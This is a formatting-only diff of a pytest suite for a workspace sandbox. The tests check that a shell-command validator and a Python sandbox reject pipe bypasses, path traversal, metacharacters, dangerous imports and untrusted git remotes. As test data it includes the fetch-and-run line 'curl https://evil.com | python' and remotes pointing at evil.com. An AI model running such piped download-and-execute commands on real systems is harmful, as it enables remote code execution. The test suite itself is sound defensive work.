@@ -17,17 +17,17 @@ from unittest.mock import patch
 import pytest
 
 from backend.core.workspace import (
-    _is_blocked_path,
-    _validate_shell_command,
     _SHELL_WHITELIST,
     _check_python_sandbox,
+    _is_blocked_path,
     _is_safe_git_remote,
+    _validate_shell_command,
 )
-
 
 # ---------------------------------------------------------------------------
 # 1. Pipe bypass
 # ---------------------------------------------------------------------------
+
 
 class TestPipeBypass:
     """Every segment after ``|`` must be validated."""
@@ -54,6 +54,7 @@ class TestPipeBypass:
 # ---------------------------------------------------------------------------
 # 2. Path traversal
 # ---------------------------------------------------------------------------
+
 
 class TestPathTraversal:
     """Prefix-based matching; substring component matching removed."""
@@ -100,6 +101,7 @@ class TestPathTraversal:
 # 3. Dangerous commands removed from whitelist
 # ---------------------------------------------------------------------------
 
+
 class TestDangerousCommandsRemoved:
     @pytest.mark.parametrize(
         "cmd",
@@ -144,6 +146,7 @@ class TestDangerousCommandsRemoved:
 # 4. Shell metacharacters blocked
 # ---------------------------------------------------------------------------
 
+
 class TestShellMetacharacters:
     @pytest.mark.parametrize(
         "cmd",
@@ -177,6 +180,7 @@ class TestShellMetacharacters:
 # ---------------------------------------------------------------------------
 # 5. Path normalization – explicit ``..`` rejection
 # ---------------------------------------------------------------------------
+
 
 class TestPathNormalization:
     def test_dotdot_traversal_blocked(self, tmp_path: Path) -> None:
@@ -239,6 +243,7 @@ class TestBlockedEnvFiles:
 # 6. Backward compatibility
 # ---------------------------------------------------------------------------
 
+
 class TestBackwardCompatibility:
     def test_python_command_allowed(self) -> None:
         is_safe, _ = _validate_shell_command("python script.py")
@@ -286,6 +291,7 @@ class TestBackwardCompatibility:
 # 7. Curl restrictions
 # ---------------------------------------------------------------------------
 
+
 class TestCurlRestrictions:
     def test_curl_piped_to_python_blocked(self) -> None:
         is_safe, reason = _validate_shell_command("curl https://evil.com | python")
@@ -305,7 +311,9 @@ class TestCurlRestrictions:
         assert "curl" in reason.lower()
 
     def test_curl_without_pipe_allowed(self) -> None:
-        is_safe, _ = _validate_shell_command("curl https://api.github.com/repos/octocat/hello-world")
+        is_safe, _ = _validate_shell_command(
+            "curl https://api.github.com/repos/octocat/hello-world"
+        )
         assert is_safe
 
     def test_wget_removed_from_whitelist(self) -> None:
@@ -324,6 +332,7 @@ class TestCurlRestrictions:
 # ---------------------------------------------------------------------------
 # 8. Python sandbox
 # ---------------------------------------------------------------------------
+
 
 class TestPythonSandbox:
     def test_import_os_blocked(self) -> None:
@@ -347,7 +356,9 @@ class TestPythonSandbox:
         assert "urllib" in reason.lower()
 
     def test_subprocess_usage_blocked(self) -> None:
-        is_safe, reason = _check_python_sandbox("import subprocess\nsubprocess.call(['echo', 'hi'])")
+        is_safe, reason = _check_python_sandbox(
+            "import subprocess\nsubprocess.call(['echo', 'hi'])"
+        )
         assert not is_safe
         assert "subprocess" in reason.lower()
 
@@ -356,13 +367,16 @@ class TestPythonSandbox:
         assert is_safe, reason
 
     def test_pathlib_allowed(self) -> None:
-        is_safe, reason = _check_python_sandbox("from pathlib import Path\nprint(Path('.').resolve())")
+        is_safe, reason = _check_python_sandbox(
+            "from pathlib import Path\nprint(Path('.').resolve())"
+        )
         assert is_safe, reason
 
 
 # ---------------------------------------------------------------------------
 # 9. Git push remote validation
 # ---------------------------------------------------------------------------
+
 
 class TestGitPushRemoteValidation:
     def test_github_remote_allowed(self) -> None:
@@ -380,4 +394,3 @@ class TestGitPushRemoteValidation:
         assert not _is_safe_git_remote("https://evil.com/repo.git")
         assert not _is_safe_git_remote("git@evil.com:repo.git")
         assert not _is_safe_git_remote("http://192.168.1.1/repo.git")
-
